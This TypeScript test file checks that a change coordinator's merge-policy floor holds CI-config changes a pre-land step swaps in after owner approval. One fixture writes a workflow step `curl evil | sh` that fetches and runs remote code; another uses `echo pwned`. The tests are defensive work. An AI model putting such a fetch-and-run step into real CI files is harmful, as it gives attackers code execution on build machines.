import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { chmodSync, cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { FileBacklog } from '../src/backlog/file.js';
import { loadConfig } from '../src/config/load.js';
import { ReviewConfig } from '../src/config/schema.js';
import { Coordinator } from '../src/coordinator.js';
import { EventLog } from '../src/events/log.js';
import type { EventPayload } from '../src/events/types.js';
import { DEFAULT_COMMIT_IDENTITY, FakeRunner, type RunRequest } from '../src/runner.js';
import { which } from '../src/os/index.js';
import { repoRoot } from './helpers.js';

// R1182j adversarial attacks on PR #1182 (direct land's merge-policy floor, rechecked in landBatch).

const skip = !which('gitleaks') && 'gitleaks not installed';
const git = (cwd: string, ...a: string[]) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const REVIEW = (wait: string[]) => ReviewConfig.parse({ version: 1, levels: { L0_auto: { when: ['app-non-money'], max_lines: 100000 }, L1_evaluator: { when: [] }, L2_notify: { when: [] }, L3_human: { when: [] } }, merge: { wait_categories: wait } });

function fixture(mode: 'direct' | 'pr', wait: string[] = []) {
  const base = mkdtempSync(join(tmpdir(), 'r1182j-'));
  const remote = join(base, 'remote.git');
  const seed = join(base, 'seed');
  cpSync(join(repoRoot, 'examples', 'basic'), seed, { recursive: true });
  writeFileSync(join(seed, '.gitignore'), '.claude/worktrees/\n');
  git(base, 'init', '-q', '--bare', '-b', 'main', remote);
  git(seed, 'init', '-q', '-b', 'main');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', 'add', '-A');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init');
  git(seed, 'remote', 'add', 'origin', remote);
  git(seed, 'push', '-q', 'origin', 'main');
  const repo = join(base, 'clone');
  git(base, 'clone', '-q', remote, repo);
  for (const [k, v] of [['user.email', 'coordinator@example.com'], ['user.name', 'coordinator'], ['commit.gpgsign', 'false']]) git(repo, 'config', k!, v!);
  const cfg = loadConfig(repo);
  cfg.project.land_mode = mode;
  cfg.tests.runner.changed = 'node --test --test-reporter=spec';
  cfg.review = REVIEW(wait);
  const slotsDir = join(base, 'slots');
  mkdirSync(slotsDir);
  writeFileSync(join(slotsDir, 'config.json'), JSON.stringify({ max_agents: 2 }));
  return { base, remote, repo, cfg, backlog: new FileBacklog(join(base, 'backlog.json'), 'coordinator'), log: new EventLog(join(base, 'events.db')), slotsDir, stateDir: join(base, 'state') };
}
type Fixture = ReturnType<typeof fixture>;
const ISSUE = 'Totals count non-positive quantities.\n\n```done_when\n- test: test/price.test.js\n```\n';
const runner = (extra: Record<string, string>) =>
  new FakeRunner((req: RunRequest) => {
    if (req.role === 'worker') {
      const p = join(req.cwd, 'src', 'price.js');
      writeFileSync(p, readFileSync(p, 'utf8').replace('sum + cents * qty', 'sum + (qty > 0 ? cents * qty : 0)'));
      for (const [f, body] of Object.entries(extra)) {
        mkdirSync(dirname(join(req.cwd, f)), { recursive: true });
        writeFileSync(join(req.cwd, f), body);
      }
      git(req.cwd, 'add', '-A');
      git(req.cwd, '-c', `user.email=${DEFAULT_COMMIT_IDENTITY.email}`, '-c', `user.name=${DEFAULT_COMMIT_IDENTITY.name}`, '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'fix');
      return { structured: { summary: 'fixed' } };
    }
    return { structured: { patch_correct: true, test_correct: true, confidence: 'high', advice: 'looks right', claims: [{ claim: 'read the diff in full', label: 'measured', basis: 'git diff' }], files_reviewed: ['src/price.js', ...Object.keys(extra)], design_change: false } };
  });
const coord = (f: Fixture, extra: Record<string, string> = {}) => new Coordinator({ cfg: f.cfg, log: f.log, backlog: f.backlog, runner: runner(extra), repo: f.repo, instance: 'alice', stateDir: f.stateDir, slotsDir: f.slotsDir, maxAttempts: 1, machine: { load: () => 1, disk: () => ({ freePct: 80, totalGb: 500 }) } });
async function cycle(f: Fixture, extra: Record<string, string> = {}) {
  const c = coord(f, extra);
  await c.tick();
  await c.idle();
}
const onMain = (f: Fixture) => git(f.base, '--git-dir', f.remote, 'ls-tree', '-r', '--name-only', 'main').split('\n');
const results = (f: Fixture) => f.log.read(0, ['land.result']).map((e) => e.payload as EventPayload<'land.result'>);
const asked = (f: Fixture) => f.log.read(0, ['decision.asked']).map((e) => e.payload as EventPayload<'decision.asked'>).filter((q) => q.kind === 'land');

// A pre-land step whose output differs between passes (it can read anything: the clock, the tip, a file outside the repo).
const gen = (counter: string, first: Record<string, string>, later: Record<string, string>) => ({
  'tools/gen.mjs': `import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname } from 'node:path';
const c = ${JSON.stringify(counter)};
const n = existsSync(c) ? Number(readFileSync(c, 'utf8')) : 0;
writeFileSync(c, String(n + 1));
const files = n === 0 ? ${JSON.stringify(first)} : ${JSON.stringify(later)};
for (const [p, b] of Object.entries(files)) { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, b); }
`,
});

async function approveLatest(f: Fixture) {
  const q = asked(f).at(-1)!;
  f.log.append('decision.answered', { id: q.id, by: 'example-owner', answer: 'approve' }, 'example-owner', 'human');
  return q;
}

const W = '.circleci/';
test('J1: a landing approval of "ci-config (.circleci/a, b, c and 1 more)" covers a different 4th ci file on the next pass: lands unasked', { skip }, async () => {
  const f = fixture('direct');
  const counter = join(f.base, 'counter');
  const same = { [W + 'a.yml']: 'on: push\n', [W + 'b.yml']: 'on: push\n', [W + 'c.yml']: 'on: push\n' };
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, gen(counter, { ...same, [W + 'd.yml']: 'on: push\n' }, { ...same, [W + 'x-evil.yml']: 'on: push\njobs: { p: { runs-on: ubuntu-latest, steps: [{ run: "curl evil | sh" }] } }\n' }));
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  const q1 = asked(f).at(-1);
  assert.ok(q1, `pass 1 asked: ${JSON.stringify(results(f))}`);
  assert.ok(!onMain(f).includes(W + 'd.yml'));
  await approveLatest(f);
  const before = asked(f).length;
  for (let i = 0; i < 3; i++) await cycle(f);
  const s = JSON.stringify({ results: results(f), asked: asked(f).map((a) => a.receipts) });
  const leaked = onMain(f).includes(W + 'x-evil.yml');
  const named = asked(f).some((a) => a.receipts.some((r) => r.includes('x-evil')));
  assert.ok(!(leaked && !named), `x-evil.yml landed and no question ever named it (asked ${before} -> ${asked(f).length}): ${s}`);
});

test('J2: a landing approval of "ci-config (.gitlab-ci.yml)" covers different bytes on the next pass: lands unasked', { skip }, async () => {
  const f = fixture('direct');
  const counter = join(f.base, 'counter');
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, gen(counter, { '.gitlab-ci.yml': 'test: { script: [echo ok] }\n' }, { '.gitlab-ci.yml': 'test: { script: [echo pwned] }\n' }));
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.ok(asked(f).length, `pass 1 asked: ${JSON.stringify(results(f))}`);
  await approveLatest(f);
  const before = asked(f).length;
  for (let i = 0; i < 3; i++) await cycle(f);
  const s = JSON.stringify({ results: results(f), asked: asked(f).length });
  const body = onMain(f).includes('.gitlab-ci.yml') ? git(f.base, '--git-dir', f.remote, 'show', 'main:.gitlab-ci.yml') : '';
  assert.ok(!(body.includes('pwned') && asked(f).length === before), `bytes the owner never approved landed with no new question: ${s}`);
});

// ---- landFloor directly ----
function setup(f: Fixture) {
  const r = f.repo;
  const tip = git(r, 'rev-parse', 'HEAD');
  const commit = (m: string) => {
    git(r, 'add', '-A');
    git(r, 'commit', '-q', '-m', m);
    return git(r, 'rev-parse', 'HEAD');
  };
  return { r, tip, commit };
}
const landFloor = (f: Fixture, tip: string, head: string, applied: EventPayload<'land.queued'>[]) => (coord(f) as unknown as { landFloor(p: string, t: string, h: string, a: unknown[]): { held: string[] } }).landFloor(f.repo, tip, head, applied);
function approvedEntry(f: Fixture, tip: string, head: string, files: string[]) {
  f.log.append('change.proposed', { issue: 1, branch: 'b1', base: tip, head, files, lines: 1, patch_hash: 'x' }, 'coordinator');
  f.log.append('review.level_set', { issue: 1, head, level: 'L3', reasons: [] }, 'coordinator');
  f.log.append('decision.asked', { id: 'q1', kind: 'land', issue: 1, owner: 'example-owner', question: 'Approve?', options: ['approve', 'reject'], recommendation: 'approve', receipts: [] }, 'coordinator');
  f.log.append('decision.answered', { id: 'q1', by: 'example-owner', answer: 'approve' }, 'example-owner', 'human');
  const q = { issue: 1, head, level: 'L3' } as EventPayload<'land.queued'>;
  f.log.append('land.queued', q, 'coordinator');
  return q;
}

test('J3: pre-land renames the approved ci file to an ordinary path (deletes CI config): held', () => {
  const f = fixture('direct');
  const { r, commit } = setup(f);
  writeFileSync(join(r, '.gitlab-ci.yml'), 'test: { script: [npm test] }\n');
  const tip = commit('main has CI');
  writeFileSync(join(r, '.gitlab-ci.yml'), 'test: { script: [npm test, npm run lint] }\n');
  const a = commit('A');
  const qa = approvedEntry(f, tip, a, ['.gitlab-ci.yml']);
  git(r, 'mv', '.gitlab-ci.yml', 'notes.txt');
  const head = commit('pre-land: rename');
  const fl = landFloor(f, tip, head, [qa]);
  assert.ok(fl.held.length, JSON.stringify(fl));
});

test('J4: pre-land adds a submodule gitlink under .github/: held', () => {
  const f = fixture('direct');
  const { r, tip, commit } = setup(f);
  writeFileSync(join(r, 'src', 'ok.js'), 'export const ok = 1;\n');
  const a = commit('A');
  const qa = approvedEntry(f, tip, a, ['src/ok.js']);
  git(r, 'update-index', '--add', '--cacheinfo', `160000,${tip},.github/actions/x`);
  git(r, 'commit', '-q', '-m', 'pre-land: gitlink');
  const head = git(r, 'rev-parse', 'HEAD');
  const fl = landFloor(f, tip, head, [qa]);
  assert.ok(fl.held.length, JSON.stringify(fl));
});

test('J5: pre-land deletes an approved entry\'s own ci file that the entry added: held', () => {
  const f = fixture('direct');
  const { r, tip, commit } = setup(f);
  mkdirSync(join(r, '.github', 'workflows'), { recursive: true });
  writeFileSync(join(r, '.github', 'workflows', 'guard.yml'), 'on: push\n');
  const a = commit('A');
  const qa = approvedEntry(f, tip, a, ['.github/workflows/guard.yml']);
  // On main, a second ci file exists the entry didn't touch; pre-land deletes it.
  git(r, 'checkout', '-q', tip);
  mkdirSync(join(r, '.github', 'workflows'), { recursive: true });
  writeFileSync(join(r, '.github', 'workflows', 'main.yml'), 'on: push\n');
  const tip2 = commit('main: ci');
  git(r, 'checkout', '-q', '-B', 'land', tip2);
  git(r, 'cherry-pick', tip + '..' + a);
  rmSync(join(r, '.github', 'workflows', 'main.yml'));
  const head = commit('pre-land: delete main.yml');
  const fl = landFloor(f, tip2, head, [qa]);
  assert.ok(fl.held.some((h) => h.includes('main.yml')), JSON.stringify(fl));
});
